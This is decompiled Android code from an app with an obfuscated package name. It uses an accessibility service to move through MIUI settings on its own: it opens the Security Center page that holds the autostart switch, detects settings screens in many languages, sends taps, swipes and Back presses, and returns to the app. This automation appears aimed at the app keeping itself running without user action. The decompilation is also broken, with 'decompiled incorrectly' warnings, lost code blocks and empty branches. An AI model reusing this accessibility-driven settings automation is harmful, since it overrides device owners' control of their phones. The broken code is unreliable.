        tz0.m214807a7("[MIUI] ", str, this.f55108a2);
    }

    /* renamed from: d9 */
    public final Boolean m212275d9() {
        Context context = this.f55107a1;
        m212274d8("│ │ 🔹 优先使用安全中心（带自启动开关）");
        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName(StringUtil.m212470a0("KFYcdEAxGScZIi5aBChELBUtUj8/XAM="), "com.miui.appmanager.ApplicationsDetailsActivity"));
            intent.putExtra("package_name", context.getPackageName());
            intent.setFlags(1350631424);
            context.startActivity(intent);
            m212274d8("│ │   ✅ 安全中心应用详情已打开（带自启动）");
            return Boolean.TRUE;
        } catch (Exception e) {
            m212274d8("│ │   ⚠️ 安全中心打开失败: " + e.getMessage() + "，尝试标准方式");
            m212274d8("│ │ 🔹 备用：使用标准Settings打开");
            try {
                Intent intent2 = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS");
                intent2.setData(Uri.parse("package:" + context.getPackageName()));
                intent2.setFlags(1350631424);
                context.startActivity(intent2);
                m212274d8("│ │   ✅ 标准应用详情已打开（无自启动）");
                return Boolean.TRUE;
            } catch (Exception e2) {
                AbstractC0003a2.m45c6("│ │   ❌ 打开失败: ", e2.getMessage(), this);
                return Boolean.FALSE;
            }
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:118:0x028c, code lost:
    
        if (p000.b81.m210571b1(300, r2) != r3) goto L32;
     */
    /* JADX WARN: Path cross not found for [B:33:0x00af, B:24:0x0087], limit reached: 152 */
    /* JADX WARN: Removed duplicated region for block: B:126:0x02b2  */
    /* JADX WARN: Removed duplicated region for block: B:127:0x02b8  */
    /* JADX WARN: Removed duplicated region for block: B:24:0x0087  */
    /* JADX WARN: Removed duplicated region for block: B:33:0x00af  */
    /* JADX WARN: Removed duplicated region for block: B:42:0x00ec  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:118:0x028c -> B:32:0x00aa). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:124:0x02aa -> B:32:0x00aa). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:31:0x00a6 -> B:32:0x00aa). Please report as a decompilation issue!!! */
    /* renamed from: e0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212276e0(int i, ContinuationImpl continuationImpl) throws Throwable {
        MiuiSteps$openSettingsWithVerify$1 miuiSteps$openSettingsWithVerify$1;
        int i2;
        C0367a4 c0367a4;
        MiuiSteps$openSettingsWithVerify$1 miuiSteps$openSettingsWithVerify$12;
        int i3;
        int i4;
        int i5;
        int i6;
        int i7;
        int i8;
        AccessibilityNodeInfo rootInActiveWindow;
        boolean z;
        boolean z2;
        boolean z3;
        CharSequence className;
        String string;
        if (continuationImpl instanceof MiuiSteps$openSettingsWithVerify$1) {
            miuiSteps$openSettingsWithVerify$1 = (MiuiSteps$openSettingsWithVerify$1) continuationImpl;
            int i9 = miuiSteps$openSettingsWithVerify$1.f54441a6;
            if ((i9 & Integer.MIN_VALUE) != 0) {
                miuiSteps$openSettingsWithVerify$1.f54441a6 = i9 - Integer.MIN_VALUE;
            } else {
                miuiSteps$openSettingsWithVerify$1 = new MiuiSteps$openSettingsWithVerify$1(this, continuationImpl);
            }
        }
        Object obj = miuiSteps$openSettingsWithVerify$1.f54439a4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i10 = miuiSteps$openSettingsWithVerify$1.f54441a6;
        int i11 = 3;
        if (i10 == 0) {
            kg1.m213544f4(obj);
            m212274d8("[设置] ────────────────────────────────────");
            m212274d8("[设置] 🚀 打开设置页面...");
            i2 = i;
            c0367a4 = this;
            if (1 <= i2) {
                miuiSteps$openSettingsWithVerify$12 = miuiSteps$openSettingsWithVerify$1;
                i3 = 1;
                i4 = i2;
                i5 = 0;
                c0367a4.m212274d8("[设置验证] ========== 第" + i3 + "次尝试 ==========");
                if (c0367a4.f55106a0.getRootInActiveWindow() == null) {
                }
            }
            c0367a4.m212274d8("[设置验证] ❌ 达到最大重试次数 " + i2 + "，放弃");
            return Boolean.FALSE;
        }
        if (i10 != 1 && i10 != 2) {
            if (i10 == 3) {
                i7 = miuiSteps$openSettingsWithVerify$1.f54438a3;
                i8 = miuiSteps$openSettingsWithVerify$1.f54437a2;
                i6 = miuiSteps$openSettingsWithVerify$1.f54436a1;
                c0367a4 = miuiSteps$openSettingsWithVerify$1.f54435a0;
                kg1.m213544f4(obj);
                rootInActiveWindow = c0367a4.f55106a0.getRootInActiveWindow();
                if (rootInActiveWindow != null) {
                    CharSequence packageName = rootInActiveWindow.getPackageName();
                    String string2 = packageName != null ? packageName.toString() : null;
                    if (t60.m214686a2(string2, "com.android.settings") || t60.m214686a2(string2, "com.xiaomi.misettings")) {
                        Iterator it = AbstractC0716jf.m213306g5("设置", "設置", "設定", "Settings", "Einstellungen", "Paramètres", "Ajustes", "Configuración", "Configurações", "Impostazioni", "Настройки", "설정", "Cài đặt", "การตั้งค่า", "Setelan", "Pengaturan").iterator();
                        loop0: while (true) {
                            if (!it.hasNext()) {
                                z = false;
                                break;
                            }
                            String str = (String) it.next();
                            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str);
                            if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                                for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
                                    if (accessibilityNodeInfo.isVisibleToUser()) {
                                        CharSequence text = accessibilityNodeInfo.getText();
                                        if (t60.m214686a2(text != null ? text.toString() : null, str) && (className = accessibilityNodeInfo.getClassName()) != null && (string = className.toString()) != null && AbstractC0779a1.m213652a5(string, "TextView", false)) {
                                            AbstractC0003a2.m45c6("[isOnSettingsPage] 找到设置标题: ", str, c0367a4);
                                            z = true;
                                            break loop0;
                                        }
                                    }
                                }
                            }
                        }
                        Iterator it2 = AbstractC0716jf.m213306g5("向上导航", "向上", "返回", "Navigate up", "Back", "Retour", "Zurück", "Indietro", "Voltar", "Atrás", "Назад", "뒤로", "Kembali").iterator();
                        loop2: while (true) {
                            if (!it2.hasNext()) {
                                z2 = false;
                                break;
                            }
                            String str2 = (String) it2.next();
                            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText2 = rootInActiveWindow.findAccessibilityNodeInfosByText(str2);
                            if (listFindAccessibilityNodeInfosByText2 != null && !listFindAccessibilityNodeInfosByText2.isEmpty()) {
                                Iterator<T> it3 = listFindAccessibilityNodeInfosByText2.iterator();
                                while (it3.hasNext()) {
                                    if (((AccessibilityNodeInfo) it3.next()).isVisibleToUser()) {
                                        AbstractC0003a2.m45c6("[isOnSettingsPage] 检测到返回按钮关键词: ", str2, c0367a4);
                                        z2 = true;
                                        break loop2;
                                    }
                                }
                            }
                        }
                        Iterator it4 = AbstractC0715je.m213301i8(dh0.f55753a3, 10).iterator();
                        loop4: while (true) {
                            if (!it4.hasNext()) {
                                z3 = false;
                                break;
                            }
                            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText3 = rootInActiveWindow.findAccessibilityNodeInfosByText((String) it4.next());
                            if (listFindAccessibilityNodeInfosByText3 != null && !listFindAccessibilityNodeInfosByText3.isEmpty()) {
                                Iterator<T> it5 = listFindAccessibilityNodeInfosByText3.iterator();
                                while (it5.hasNext()) {
                                    if (((AccessibilityNodeInfo) it5.next()).isVisibleToUser()) {
                                        z3 = true;
                                        break loop4;
                                    }
                                }
                            }
                        }
                        c0367a4.m212274d8("[isOnSettingsPage] 有设置标题: " + z + ", 有返回按钮: " + z2 + ", 有取消按钮: " + z3);
                        if (z && !z2 && !z3) {
                            c0367a4.m212274d8("[isOnSettingsPage] ✅ 在设置首页");
                            c0367a4.m212274d8("[设置验证] ✅ 已在设置页面");
                            return Boolean.TRUE;
                        }
                        c0367a4.m212274d8("[isOnSettingsPage] ❌ 不在设置首页");
                    } else {
                        AbstractC0003a2.m45c6("[isOnSettingsPage] ❌ 不是设置包名: ", string2, c0367a4);
                    }
                }
                c0367a4.m212274d8("[设置验证] ⚠️ 未在设置页面，返回一次...");
                c0367a4.f55106a0.performGlobalAction(1);
                miuiSteps$openSettingsWithVerify$1.f54435a0 = c0367a4;
                miuiSteps$openSettingsWithVerify$1.f54436a1 = i6;
                miuiSteps$openSettingsWithVerify$1.f54437a2 = i8;
                miuiSteps$openSettingsWithVerify$1.f54438a3 = i7;
                miuiSteps$openSettingsWithVerify$1.f54441a6 = 4;
            } else if (i10 != 4) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
        }
        i7 = miuiSteps$openSettingsWithVerify$1.f54438a3;
        i8 = miuiSteps$openSettingsWithVerify$1.f54437a2;
        i6 = miuiSteps$openSettingsWithVerify$1.f54436a1;
        c0367a4 = miuiSteps$openSettingsWithVerify$1.f54435a0;
        kg1.m213544f4(obj);
        MiuiSteps$openSettingsWithVerify$1 miuiSteps$openSettingsWithVerify$13 = miuiSteps$openSettingsWithVerify$1;
        i5 = i8;
        i4 = i6;
        if (i7 == i4) {
            i3 = i7 + 1;
            miuiSteps$openSettingsWithVerify$12 = miuiSteps$openSettingsWithVerify$13;
            i11 = 3;
            c0367a4.m212274d8("[设置验证] ========== 第" + i3 + "次尝试 ==========");
            if (c0367a4.f55106a0.getRootInActiveWindow() == null) {
                int i12 = i5 + 1;
                if (i12 >= i11) {
                    c0367a4.m212274d8("[设置验证] ❌ 服务不可用（rootNode 连续 null），中止");
                    return Boolean.FALSE;
                }
                miuiSteps$openSettingsWithVerify$12.f54435a0 = c0367a4;
                miuiSteps$openSettingsWithVerify$12.f54436a1 = i4;
                miuiSteps$openSettingsWithVerify$12.f54437a2 = i12;
                miuiSteps$openSettingsWithVerify$12.f54438a3 = i3;
                miuiSteps$openSettingsWithVerify$12.f54441a6 = 1;
                if (b81.m210571b1(1000L, miuiSteps$openSettingsWithVerify$12) != coroutineSingletons) {
                    i6 = i4;
                    miuiSteps$openSettingsWithVerify$1 = miuiSteps$openSettingsWithVerify$12;
                    i7 = i3;
                    i8 = i12;
                    MiuiSteps$openSettingsWithVerify$1 miuiSteps$openSettingsWithVerify$132 = miuiSteps$openSettingsWithVerify$1;
                    i5 = i8;
                    i4 = i6;
                    if (i7 == i4) {
                        i2 = i4;
                        c0367a4.m212274d8("[设置验证] ❌ 达到最大重试次数 " + i2 + "，放弃");
                        return Boolean.FALSE;
                    }
                }
                return coroutineSingletons;
            }
            c0367a4.m212274d8("[设置] 1. 发送Intent");
            try {
            } catch (Exception e) {
                AbstractC0003a2.m45c6("[设置]    ❌ 打开失败: ", e.getMessage(), c0367a4);
                miuiSteps$openSettingsWithVerify$12.f54435a0 = c0367a4;
                miuiSteps$openSettingsWithVerify$12.f54436a1 = i4;
                miuiSteps$openSettingsWithVerify$12.f54437a2 = 0;
                miuiSteps$openSettingsWithVerify$12.f54438a3 = i3;
                miuiSteps$openSettingsWithVerify$12.f54441a6 = 2;
                if (b81.m210571b1(500L, miuiSteps$openSettingsWithVerify$12) != coroutineSingletons) {
                    i6 = i4;
                    miuiSteps$openSettingsWithVerify$1 = miuiSteps$openSettingsWithVerify$12;
                    i7 = i3;
                    i8 = 0;
                }
            }
            Intent intent = new Intent("android.settings.SETTINGS");
            intent.setFlags(1350631424);
            c0367a4.f55107a1.startActivity(intent);
            c0367a4.m212274d8("[设置]    ✅ Intent已发送");
            miuiSteps$openSettingsWithVerify$12.f54435a0 = c0367a4;
            miuiSteps$openSettingsWithVerify$12.f54436a1 = i4;
            miuiSteps$openSettingsWithVerify$12.f54437a2 = 0;
            miuiSteps$openSettingsWithVerify$12.f54438a3 = i3;
            miuiSteps$openSettingsWithVerify$12.f54441a6 = i11;
            if (b81.m210571b1(500L, miuiSteps$openSettingsWithVerify$12) != coroutineSingletons) {
                i6 = i4;
                miuiSteps$openSettingsWithVerify$1 = miuiSteps$openSettingsWithVerify$12;
                i7 = i3;
                i8 = 0;
                rootInActiveWindow = c0367a4.f55106a0.getRootInActiveWindow();
                if (rootInActiveWindow != null) {
                }
                c0367a4.m212274d8("[设置验证] ⚠️ 未在设置页面，返回一次...");
                c0367a4.f55106a0.performGlobalAction(1);
                miuiSteps$openSettingsWithVerify$1.f54435a0 = c0367a4;
                miuiSteps$openSettingsWithVerify$1.f54436a1 = i6;
                miuiSteps$openSettingsWithVerify$1.f54437a2 = i8;
                miuiSteps$openSettingsWithVerify$1.f54438a3 = i7;
                miuiSteps$openSettingsWithVerify$1.f54441a6 = 4;
            }
            return coroutineSingletons;
        }
    }

    /* renamed from: e2 */
    public final boolean m212277e2(float f, float f2, long j) throws InterruptedException {
        try {
            Thread.sleep(50L);
            Path path = new Path();
            path.moveTo(f, f2);
            GestureDescription gestureDescriptionBuild = new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 10L, j)).build();
            CountDownLatch countDownLatch = new CountDownLatch(1);
            Ref$BooleanRef ref$BooleanRef = new Ref$BooleanRef();
            this.f55106a0.dispatchGesture(gestureDescriptionBuild, new C0619ie(ref$BooleanRef, countDownLatch, 2), null);
            countDownLatch.await(1000L, TimeUnit.MILLISECONDS);
            Thread.sleep(100L);
            return ref$BooleanRef.f57622a0;
        } catch (Exception e) {
            AbstractC0003a2.m45c6("[手势点击] 异常: ", e.getMessage(), this);
            return false;
        }
    }

    /* renamed from: e3 */
    public final boolean m212278e3(float f, float f2, float f3, float f4) {
        try {
            Path path = new Path();
            path.moveTo(f, f2);
            path.lineTo(f3, f4);
            this.f55106a0.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 10L, 300L)).build(), new rl0(2, this), null);
            SystemClock.sleep(500L);
            return true;
        } catch (Exception e) {
            AbstractC0003a2.m45c6("[滑动] 失败: ", e.getMessage(), this);
            return false;
        }
    }

    /* renamed from: e4 */
    public final boolean m212279e4(AccessibilityNodeInfo accessibilityNodeInfo, boolean z) {
        try {
            boolean zPerformAction = accessibilityNodeInfo.performAction(z ? Buffer.SEGMENTING_THRESHOLD : Segment.SIZE);
            m212274d8("[系统滑动] " + (z ? "向下" : "向上") + ": " + zPerformAction);
            SystemClock.sleep(200L);
            return zPerformAction;
        } catch (Exception e) {
            AbstractC0003a2.m45c6("[系统滑动] 失败: ", e.getMessage(), this);
            return false;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:20:0x0058, code lost:
    
        if (p000.b81.m210571b1(50, r0) == r1) goto L25;
     */
    /* JADX WARN: Code restructure failed: missing block: B:24:0x006b, code lost:
    
        if (p000.b81.m210571b1(50, r0) == r1) goto L25;
     */
    /* JADX WARN: Removed duplicated region for block: B:19:0x0047  */
    /* JADX WARN: Removed duplicated region for block: B:23:0x005d  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:20:0x0058 -> B:22:0x005b). Please report as a decompilation issue!!! */
    /* renamed from: e5 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212280e5(ContinuationImpl continuationImpl) throws Throwable {
        MiuiSteps$returnToHome$1 miuiSteps$returnToHome$1;
        int i;
        C0367a4 c0367a4;
        int i2;
        if (continuationImpl instanceof MiuiSteps$returnToHome$1) {
            miuiSteps$returnToHome$1 = (MiuiSteps$returnToHome$1) continuationImpl;
            int i3 = miuiSteps$returnToHome$1.f54447a5;
            if ((i3 & Integer.MIN_VALUE) != 0) {
                miuiSteps$returnToHome$1.f54447a5 = i3 - Integer.MIN_VALUE;
            } else {
                miuiSteps$returnToHome$1 = new MiuiSteps$returnToHome$1(this, continuationImpl);
            }
        }
        Object obj = miuiSteps$returnToHome$1.f54445a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i4 = miuiSteps$returnToHome$1.f54447a5;
        if (i4 == 0) {
            kg1.m213544f4(obj);
            i = 0;
            c0367a4 = this;
            i2 = 3;
            if (i >= i2) {
            }
            return coroutineSingletons;
        }
        if (i4 != 1) {
            if (i4 != 2) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            kg1.m213544f4(obj);
            return C1351vv.f60710b1;
        }
        i = miuiSteps$returnToHome$1.f54444a2;
        i2 = miuiSteps$returnToHome$1.f54443a1;
        c0367a4 = miuiSteps$returnToHome$1.f54442a0;
        kg1.m213544f4(obj);
        i++;
        if (i >= i2) {
            c0367a4.f55106a0.performGlobalAction(1);
            miuiSteps$returnToHome$1.f54442a0 = c0367a4;
            miuiSteps$returnToHome$1.f54443a1 = i2;
            miuiSteps$returnToHome$1.f54444a2 = i;
            miuiSteps$returnToHome$1.f54447a5 = 1;
        } else {
            c0367a4.f55106a0.performGlobalAction(2);
            miuiSteps$returnToHome$1.f54442a0 = null;
            miuiSteps$returnToHome$1.f54447a5 = 2;
        }
        return coroutineSingletons;
    }

    /* JADX WARN: Removed duplicated region for block: B:8:0x0014  */
    /* renamed from: e6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212281e6(ContinuationImpl continuationImpl) throws Throwable {
        MiuiSteps$scrollDownWithStability$1 miuiSteps$scrollDownWithStability$1;
        boolean zM212278e3;
        boolean z;
        AccessibilityNodeInfo accessibilityNodeInfoM212243c5;
        if (continuationImpl instanceof MiuiSteps$scrollDownWithStability$1) {
            miuiSteps$scrollDownWithStability$1 = (MiuiSteps$scrollDownWithStability$1) continuationImpl;
            int i = miuiSteps$scrollDownWithStability$1.f54451a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                miuiSteps$scrollDownWithStability$1.f54451a3 = i - Integer.MIN_VALUE;
            } else {
                miuiSteps$scrollDownWithStability$1 = new MiuiSteps$scrollDownWithStability$1(this, continuationImpl);
            }
        }
        MiuiSteps$scrollDownWithStability$1 miuiSteps$scrollDownWithStability$12 = miuiSteps$scrollDownWithStability$1;
        Object obj = miuiSteps$scrollDownWithStability$12.f54449a1;
        Object obj2 = CoroutineSingletons.f57606a0;
        int i2 = miuiSteps$scrollDownWithStability$12.f54451a3;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            AccessibilityNodeInfo rootInActiveWindow = this.f55106a0.getRootInActiveWindow();
            if (rootInActiveWindow == null || (accessibilityNodeInfoM212243c5 = m212243c5(rootInActiveWindow)) == null || !m212279e4(accessibilityNodeInfoM212243c5, true)) {
                float fM212269d3 = m212269d3() * 0.1f;
                float fM212268d2 = m212268d2() * 0.6f;
                float fM212268d22 = m212268d2() * 0.35f;
                m212274d8("[scrollDown] 备用手势滑动: y" + fM212268d2 + " -> " + fM212268d22);
                zM212278e3 = m212278e3(fM212269d3, fM212268d2, fM212269d3, fM212268d22);
            } else {
                m212274d8("[scrollDown] ✅ 系统滚动");
                zM212278e3 = true;
            }
            if (zM212278e3) {
                miuiSteps$scrollDownWithStability$12.f54448a0 = zM212278e3;
                miuiSteps$scrollDownWithStability$12.f54451a3 = 1;
                if (m212294f9(2, 100L, 1000L, miuiSteps$scrollDownWithStability$12) == obj2) {
                    return obj2;
                }
                z = zM212278e3;
            }
            return Boolean.valueOf(zM212278e3);
        }
        if (i2 != 1) {
            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
        z = miuiSteps$scrollDownWithStability$12.f54448a0;
        kg1.m213544f4(obj);
        zM212278e3 = z;
        return Boolean.valueOf(zM212278e3);
    }

    /* JADX WARN: Removed duplicated region for block: B:8:0x0014  */
    /* renamed from: e7 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212282e7(ContinuationImpl continuationImpl) throws Throwable {
        MiuiSteps$scrollUpWithStability$1 miuiSteps$scrollUpWithStability$1;
        boolean zM212278e3;
        boolean z;
        AccessibilityNodeInfo accessibilityNodeInfoM212243c5;
        if (continuationImpl instanceof MiuiSteps$scrollUpWithStability$1) {
            miuiSteps$scrollUpWithStability$1 = (MiuiSteps$scrollUpWithStability$1) continuationImpl;
            int i = miuiSteps$scrollUpWithStability$1.f54455a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                miuiSteps$scrollUpWithStability$1.f54455a3 = i - Integer.MIN_VALUE;
            } else {
                miuiSteps$scrollUpWithStability$1 = new MiuiSteps$scrollUpWithStability$1(this, continuationImpl);
            }
        }
        MiuiSteps$scrollUpWithStability$1 miuiSteps$scrollUpWithStability$12 = miuiSteps$scrollUpWithStability$1;
        Object obj = miuiSteps$scrollUpWithStability$12.f54453a1;
        Object obj2 = CoroutineSingletons.f57606a0;
        int i2 = miuiSteps$scrollUpWithStability$12.f54455a3;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            AccessibilityNodeInfo rootInActiveWindow = this.f55106a0.getRootInActiveWindow();
            if (rootInActiveWindow == null || (accessibilityNodeInfoM212243c5 = m212243c5(rootInActiveWindow)) == null || !m212279e4(accessibilityNodeInfoM212243c5, false)) {
                float fM212269d3 = m212269d3() * 0.1f;
                float fM212268d2 = m212268d2() / 4;
                float fM212268d22 = m212268d2() - 600;
                m212274d8("[scrollUp] 手势滑动: y" + fM212268d2 + " -> " + fM212268d22);
                zM212278e3 = m212278e3(fM212269d3, fM212268d2, fM212269d3, fM212268d22);
            } else {
                m212274d8("[scrollUp] ✅ 系统滚动");
                zM212278e3 = true;
            }
            if (zM212278e3) {
                miuiSteps$scrollUpWithStability$12.f54452a0 = zM212278e3;
                miuiSteps$scrollUpWithStability$12.f54455a3 = 1;
                if (m212294f9(2, 100L, 1000L, miuiSteps$scrollUpWithStability$12) == obj2) {
                    return obj2;
                }
                z = zM212278e3;
            }
            return Boolean.valueOf(zM212278e3);
        }
        if (i2 != 1) {
            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
        z = miuiSteps$scrollUpWithStability$12.f54452a0;
        kg1.m213544f4(obj);
        zM212278e3 = z;
        return Boolean.valueOf(zM212278e3);
    }

    /* JADX WARN: Code restructure failed: missing block: B:38:0x00f6, code lost:
    
        if (p000.b81.m210571b1(500, r0) == r1) goto L73;
     */
    /* JADX WARN: Code restructure failed: missing block: B:51:0x014c, code lost:
    
        if (p000.b81.m210571b1(500, r0) == r1) goto L73;
     */
    /* JADX WARN: Code restructure failed: missing block: B:64:0x01a1, code lost:
    
        if (p000.b81.m210571b1(500, r0) == r1) goto L73;
     */
    /* JADX WARN: Removed duplicated region for block: B:28:0x00a8  */
    /* JADX WARN: Removed duplicated region for block: B:30:0x00b3  */
    /* JADX WARN: Removed duplicated region for block: B:35:0x00d1 A[PHI: r2
      0x00d1: PHI (r2v8 com.storm.safe.rock.service.modules.yw5xud.a4) = (r2v5 com.storm.safe.rock.service.modules.yw5xud.a4), (r2v9 com.storm.safe.rock.service.modules.yw5xud.a4) binds: [B:33:0x00cd, B:18:0x005a] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:37:0x00e8  */
    /* JADX WARN: Removed duplicated region for block: B:45:0x0110 A[PHI: r2
      0x0110: PHI (r2v10 com.storm.safe.rock.service.modules.yw5xud.a4) = (r2v8 com.storm.safe.rock.service.modules.yw5xud.a4), (r2v11 com.storm.safe.rock.service.modules.yw5xud.a4) binds: [B:36:0x00e6, B:44:0x010b] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:48:0x0127 A[PHI: r2
      0x0127: PHI (r2v13 com.storm.safe.rock.service.modules.yw5xud.a4) = (r2v10 com.storm.safe.rock.service.modules.yw5xud.a4), (r2v14 com.storm.safe.rock.service.modules.yw5xud.a4) binds: [B:46:0x0123, B:16:0x004c] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:50:0x013e  */
    /* JADX WARN: Removed duplicated region for block: B:58:0x0166 A[PHI: r2
      0x0166: PHI (r2v15 com.storm.safe.rock.service.modules.yw5xud.a4) = (r2v13 com.storm.safe.rock.service.modules.yw5xud.a4), (r2v16 com.storm.safe.rock.service.modules.yw5xud.a4) binds: [B:49:0x013c, B:57:0x0161] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:61:0x017c A[PHI: r2
      0x017c: PHI (r2v18 com.storm.safe.rock.service.modules.yw5xud.a4) = (r2v15 com.storm.safe.rock.service.modules.yw5xud.a4), (r2v19 com.storm.safe.rock.service.modules.yw5xud.a4) binds: [B:59:0x0179, B:14:0x003e] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:63:0x0193  */
    /* JADX WARN: Removed duplicated region for block: B:71:0x01ba A[PHI: r2
      0x01ba: PHI (r2v20 com.storm.safe.rock.service.modules.yw5xud.a4) = (r2v18 com.storm.safe.rock.service.modules.yw5xud.a4), (r2v21 com.storm.safe.rock.service.modules.yw5xud.a4) binds: [B:62:0x0191, B:70:0x01b5] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:74:0x01d1  */
    /* JADX WARN: Removed duplicated region for block: B:77:0x01e9  */
    /* JADX WARN: Removed duplicated region for block: B:79:0x01f4  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: e8 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212283e8(ContinuationImpl continuationImpl) throws Throwable {
        MiuiSteps$smartReturnToAppForAndroid9OrBelow$1 miuiSteps$smartReturnToAppForAndroid9OrBelow$1;
        C0367a4 c0367a4;
        boolean zM212273d7;
        boolean zM212273d72;
        boolean zM212273d73;
        C0367a4 c0367a42;
        boolean zM212273d74;
        if (continuationImpl instanceof MiuiSteps$smartReturnToAppForAndroid9OrBelow$1) {
            miuiSteps$smartReturnToAppForAndroid9OrBelow$1 = (MiuiSteps$smartReturnToAppForAndroid9OrBelow$1) continuationImpl;
            int i = miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54459a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54459a3 = i - Integer.MIN_VALUE;
            } else {
                miuiSteps$smartReturnToAppForAndroid9OrBelow$1 = new MiuiSteps$smartReturnToAppForAndroid9OrBelow$1(this, continuationImpl);
            }
        }
        Object obj = miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54457a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        switch (miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54459a3) {
            case 0:
                kg1.m213544f4(obj);
                m212274d8("│");
                m212274d8("│ ┌─ [Android 9及以下] 智能返回应用 ───────────────────");
                m212274d8("│ │ 🏠 开始智能返回应用流程（最多4次返回操作）");
                boolean zM212273d75 = m212273d7();
                m212274d8("│ │ 🔍 第一次检测：当前是否在应用 = " + zM212273d75);
                if (!zM212273d75) {
                    c0367a4 = this;
                    c0367a4.m212274d8("│ │ 🔙 执行第一次返回操作");
                    c0367a4.f55106a0.performGlobalAction(1);
                    miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54456a0 = c0367a4;
                    miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54459a3 = 2;
                    if (b81.m210571b1(1000L, miuiSteps$smartReturnToAppForAndroid9OrBelow$1) != coroutineSingletons) {
                    }
                    return coroutineSingletons;
                }
                m212274d8("│ │ ✅ 已经在应用页面，验证稳定性");
                miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54456a0 = this;
                miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54459a3 = 1;
                if (b81.m210571b1(500L, miuiSteps$smartReturnToAppForAndroid9OrBelow$1) != coroutineSingletons) {
                    c0367a4 = this;
                    if (!c0367a4.m212273d7()) {
                        c0367a4.m212274d8("│ │ ✅ 应用页面状态稳定，无需返回");
                        c0367a4.m212274d8("│ └──────────────────────────────────────────────────────");
                        return Boolean.TRUE;
                    }
                    c0367a4.m212274d8("│ │ ⚠️ 应用页面状态不稳定，继续返回操作");
                    c0367a4.m212274d8("│ │ 🔙 执行第一次返回操作");
                    c0367a4.f55106a0.performGlobalAction(1);
                    miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54456a0 = c0367a4;
                    miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54459a3 = 2;
                    if (b81.m210571b1(1000L, miuiSteps$smartReturnToAppForAndroid9OrBelow$1) != coroutineSingletons) {
                        zM212273d7 = c0367a4.m212273d7();
                        c0367a4.m212274d8("│ │ 🔍 第二次检测：第一次返回后是否在应用 = " + zM212273d7);
                        if (!zM212273d7) {
                            c0367a4.m212274d8("│ │ ✅ 第一次返回成功，验证稳定性");
                            miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54456a0 = c0367a4;
                            miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54459a3 = 3;
                            break;
                        } else {
                            c0367a4.m212274d8("│ │ 🔙 执行第二次返回操作");
                            c0367a4.f55106a0.performGlobalAction(1);
                            miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54456a0 = c0367a4;
                            miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54459a3 = 4;
                            if (b81.m210571b1(1000L, miuiSteps$smartReturnToAppForAndroid9OrBelow$1) != coroutineSingletons) {
                                zM212273d72 = c0367a4.m212273d7();
                                c0367a4.m212274d8("│ │ 🔍 第三次检测：第二次返回后是否在应用 = " + zM212273d72);
                                if (!zM212273d72) {
                                    c0367a4.m212274d8("│ │ ✅ 第二次返回成功，验证稳定性");
                                    miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54456a0 = c0367a4;
                                    miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54459a3 = 5;
                                    break;
                                } else {
